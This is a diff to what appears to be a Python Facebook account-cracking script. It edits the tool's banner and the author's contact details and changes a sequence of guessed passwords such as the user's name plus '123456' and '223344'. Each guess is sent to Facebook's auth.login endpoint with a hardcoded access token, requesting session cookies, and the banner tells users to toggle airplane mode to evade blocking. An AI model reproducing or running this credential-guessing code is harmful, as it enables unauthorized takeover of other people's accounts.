@@ -70,18 +70,24 @@ c3 = "\033[1;91m"
 
 logo = """                                          
 
+\033[1;94m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
+\033[1;94m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
+\033[1;96m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
+\033[1;96m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
+\033[1;98m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
+\033[1;98m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝
 
 
-\033[1;96m◁━━━━━━━━━━━━━━━━━━━━◈👻◈━━━━━━━━━━━━━━━━━━━━▷\033[1;97m
+\033[1;93m◁━━━━━━━━━━━━━━━━◈😈Im-Famous-King😈◈━━━━━━━━━━━━━━━━▷\033[1;97m
 
 
-\033[1;96m(💔)\033[1;97m Author : GUPTA-SHAKEL \033[1;97m[ \033[0;92mGUPTA \033[1;97m]
+\033[1;94m...♨️\033[1;97m Author   : GUPTA-SHAKEL \033[1;97m[ \033[0;92mGUPTA \033[1;97m]
 
-\033[1;96m(💔)\033[1;97m Github : https://GitHub.com/GUPTA-SHAKEL
+\033[1;94m...♨️\033[1;97m WhatsApp : +2347013107449👾
 
-\033[1;96m(💔)\033[1;97m Fb     : Mark Cornel
+\033[1;92m...♨️\033[1;97m Facebook : Mark Cornel👾
                            
-            USE AIRPLANE MODE EVERY 10 MINT
+            🗽USE AIRPLANE MODE EVERY 10 MINT🗽
 \033[1;97m-----------------------------------------------
 
 """
@@ -651,7 +657,7 @@ def menu_select():
 
 		                        else:
 
-		                            pass4=name+"123"
+		                            pass4=name+"123456"
 
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -685,7 +691,7 @@ def menu_select():
 
 		                                else:
 
-		                                    pass5="556677"
+		                                    pass5="223344"
 
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -719,7 +725,7 @@ def menu_select():
 
 		                                        else:
 
-		                                            pass6="223344"
+		                                            pass6="334455"
 
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -753,7 +759,7 @@ def menu_select():
 
 		                                                else:
 
-		                                                    pass7="334455"
+		                                                    pass7="445566"
 
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
